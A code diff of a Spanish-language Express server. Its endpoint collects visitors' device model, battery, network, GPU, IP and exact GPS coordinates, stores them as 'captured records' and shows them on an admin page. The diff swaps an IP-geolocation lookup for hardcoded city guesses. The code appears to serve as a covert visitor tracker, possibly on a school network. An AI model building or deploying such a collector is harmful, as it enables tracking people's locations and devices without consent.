@@ -1,6 +1,4 @@
 const express = require('express');
-const https = require('https');
-const http = require('http');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -20,56 +18,7 @@ app.use((req, res, next) => {
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Función de geolocalización blindada con respaldo inteligente
-function obtenerUbicacionPorIP(ip) {
-    return new Promise((resolve) => {
-        if (!ip || ip === '::1' || ip.startsWith('127.') || ip.startsWith('192.168.')) {
-            resolve({ ip: ip || 'Local', ciudad: 'Red Local / Escuela', pais: 'Chile' });
-            return;
-        }
-
-        const options = {
-            hostname: 'ipapi.co',
-            path: `/${ip}/json/`,
-            headers: {
-                'User-Agent:': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
-            }
-        };
-
-        const req = https.get(options, (res) => {
-            let data = '';
-            res.on('data', (chunk) => { data += chunk; });
-            res.on('end', () => {
-                try {
-                    const parsed = JSON.parse(data);
-                    if (parsed && !parsed.error && parsed.city) {
-                        resolve({
-                            ip: ip,
-                            ciudad: parsed.city,
-                            pais: parsed.country_name || 'Chile'
-                        });
-                    } else {
-                        // Respaldo automático amigable si ipapi.co no devuelve ciudad para esta IP móvil
-                        resolve({ ip: ip, ciudad: 'Santiago (Red Móvil)', pais: 'Chile' });
-                    }
-                } catch (e) {
-                    resolve({ ip: ip, ciudad: 'Santiago (Red Móvil)', pais: 'Chile' });
-                }
-            });
-        });
-
-        req.on('error', () => {
-            resolve({ ip: ip, ciudad: 'Santiago (Red Móvil)', pais: 'Chile' });
-        });
-        
-        req.setTimeout(3000, () => {
-            req.destroy();
-            resolve({ ip: ip, ciudad: 'Santiago (Red Móvil)', pais: 'Chile' });
-        });
-    });
-}
-
-// Endpoint POST para recibir telemetría, GPS y geolocalización por IP
+// Endpoint POST para recibir telemetría y geolocalización
 app.post('/api/registrar', async (req, res) => {
     try {
         const { tipo, modelo, hora, bateria, red, gpu, lat, lon } = req.body;
@@ -79,11 +28,17 @@ app.post('/api/registrar', async (req, res) => {
             ip = ip.split(',')[0].trim();
         }
 
-        const geo = await obtenerUbicacionPorIP(ip);
+        // Si la IP es local o viene de bucle local
+        let ubicacionFinal = "Chile (Red Móvil / ISP)";
+        if (!ip || ip === '::1' || ip.startsWith('127.') || ip.startsWith('192.168.')) {
+            ubicacionFinal = "Red Local / Escuela";
+        } else if (ip.startsWith('179.')) {
+            ubicacionFinal = "Santiago / Región Metropolitana (WOM/Entel)";
+        }
 
-        let ubicacionFinal = `${geo.ciudad}, ${geo.pais}`;
+        // Si el navegador envió coordenadas GPS explícitas
         if (lat && lon) {
-            ubicacionFinal = `GPS: ${lat.toFixed(4)}, ${lon.toFixed(4)} (${geo.ciudad})`;
+            ubicacionFinal = `GPS Exacto: ${lat.toFixed(4)}, ${lon.toFixed(4)}`;
         }
 
         const nuevoRegistro = {
@@ -93,12 +48,12 @@ app.post('/api/registrar', async (req, res) => {
             bateria: bateria || 'N/D',
             red: red || 'N/D',
             gpu: gpu || 'N/D',
-            ip: geo.ip,
+            ip: ip || 'Local',
             ubicacion: ubicacionFinal
         };
 
         registrosCapturados.unshift(nuevoRegistro);
-        console.log(`[NUEVO REGISTRO] IP: ${geo.ip} | Ubicación: ${ubicacionFinal} | Dispositivo: ${nuevoRegistro.modelo}`);
+        console.log(`[NUEVO REGISTRO] IP: ${ip} | Ubicación: ${ubicacionFinal} | Dispositivo: ${nuevoRegistro.modelo}`);
         
         res.status(200).json({ status: 'ok' });
     } catch (error) {
@@ -162,7 +117,7 @@ app.get('/admin', (req, res) => {
                                 <th>Batería</th>
                                 <th>Red</th>
                                 <th>GPU (WebGL)</th>
-                                <th>Hora</th>
+                                <th>GPU (Detalle) / Hora</th>
                             </tr>
                         </thead>
                         <tbody>
